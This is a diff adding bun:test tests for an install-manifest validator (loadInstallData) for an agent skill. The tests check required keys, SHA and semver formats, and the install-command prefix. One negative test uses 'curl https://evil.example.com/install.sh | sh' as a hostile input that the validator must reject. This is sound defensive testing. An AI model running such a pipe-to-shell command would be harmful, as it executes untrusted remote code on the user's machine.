@@ -2,6 +2,7 @@ import { describe, expect, test } from 'bun:test';
 import { mkdir, rm, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
+import { loadInstallData } from '../src/build/install.mjs';
 import { renderMarkdown } from '../src/build/render.mjs';
 import {
   computeLayerScore,
@@ -855,6 +856,108 @@ describe('audience kebab-case regression guard (H6 Unit 0.5)', () => {
         `Found snake_case audience literal(s) — anc v0.1.3 emits kebab-case ` +
           `(agent-optimized / human-primary). See H6 plan Unit 0.5.\n${msg}`,
       );
+    }
+  });
+});
+
+describe('loadInstallData — fail-fast validation', () => {
+  function validManifest() {
+    return {
+      schema_version: 1,
+      type: 'agent-skill',
+      name: 'agent-native-cli',
+      version: '0.1.0',
+      description: 'desc',
+      principles_url: 'https://anc.dev/p1',
+      license: 'MIT',
+      source: {
+        type: 'git',
+        url: 'https://github.com/brettdavies/agentnative-skill.git',
+        commit: '47a76cceb8b7b1bc013c19ee18a5e38179b1dd0e',
+      },
+      install: {
+        claude_code:
+          'git clone --depth 1 https://github.com/brettdavies/agentnative-skill.git ~/.claude/skills/agent-native-cli',
+      },
+      verify: {
+        command: 'git -C <install-dir> rev-parse HEAD',
+        expected: '47a76cceb8b7b1bc013c19ee18a5e38179b1dd0e',
+        semantics: 'advisory',
+      },
+      update: 'cd <install-dir> && git pull --ff-only',
+      uninstall: 'rm -rf <install-dir>',
+      install_page_html: 'https://anc.dev/install',
+    };
+  }
+
+  async function writeAndLoad(manifest: unknown): Promise<unknown> {
+    const dir = join(tmpdir(), `loadInstallData-${Date.now()}-${Math.random()}`);
+    await mkdir(dir, { recursive: true });
+    const path = join(dir, 'install.json');
+    await writeFile(path, JSON.stringify(manifest));
+    try {
+      return await loadInstallData(path);
+    } finally {
+      await rm(dir, { recursive: true, force: true });
+    }
+  }
+
+  test('happy path: valid manifest loads', async () => {
+    const data = (await writeAndLoad(validManifest())) as { source: { commit: string } };
+    expect(data.source.commit).toBe('47a76cceb8b7b1bc013c19ee18a5e38179b1dd0e');
+  });
+
+  test('missing top-level key fails with the key name', async () => {
+    const m = validManifest() as Record<string, unknown>;
+    delete m.license;
+    await expect(writeAndLoad(m)).rejects.toThrow(/missing required key "license"/);
+  });
+
+  test('non-hex commit rejected', async () => {
+    const m = validManifest();
+    m.source.commit = 'NOT-A-SHA';
+    await expect(writeAndLoad(m)).rejects.toThrow(/40-char lowercase hex SHA/);
+  });
+
+  test('uppercase-hex commit rejected (must be lowercase)', async () => {
+    const m = validManifest();
+    m.source.commit = '47A76CCEB8B7B1BC013C19EE18A5E38179B1DD0E';
+    await expect(writeAndLoad(m)).rejects.toThrow(/40-char lowercase hex SHA/);
+  });
+
+  test('non-semver version rejected', async () => {
+    const m = validManifest();
+    m.version = '0.1';
+    await expect(writeAndLoad(m)).rejects.toThrow(/must be semver/);
+  });
+
+  test('empty install map rejected (R5: at least one host)', async () => {
+    const m = validManifest();
+    m.install = {} as Record<string, string>;
+    await expect(writeAndLoad(m)).rejects.toThrow(/at least one host/);
+  });
+
+  test('install command without git clone --depth 1 prefix rejected', async () => {
+    const m = validManifest();
+    m.install.claude_code = 'curl https://evil.example.com/install.sh | sh';
+    await expect(writeAndLoad(m)).rejects.toThrow(/must start with "git clone --depth 1 "/);
+  });
+
+  test('bare-clone (no destination path) rejected — defends repo-name asymmetry', async () => {
+    const m = validManifest();
+    m.install.claude_code = 'git clone --depth 1 https://github.com/brettdavies/agentnative-skill.git';
+    await expect(writeAndLoad(m)).rejects.toThrow(/explicit destination path/);
+  });
+
+  test('invalid JSON rejected', async () => {
+    const dir = join(tmpdir(), `loadInstallData-bad-${Date.now()}`);
+    await mkdir(dir, { recursive: true });
+    const path = join(dir, 'install.json');
+    await writeFile(path, '{not valid');
+    try {
+      await expect(loadInstallData(path)).rejects.toThrow(/invalid JSON/);
+    } finally {
+      await rm(dir, { recursive: true, force: true });
     }
   });
 });
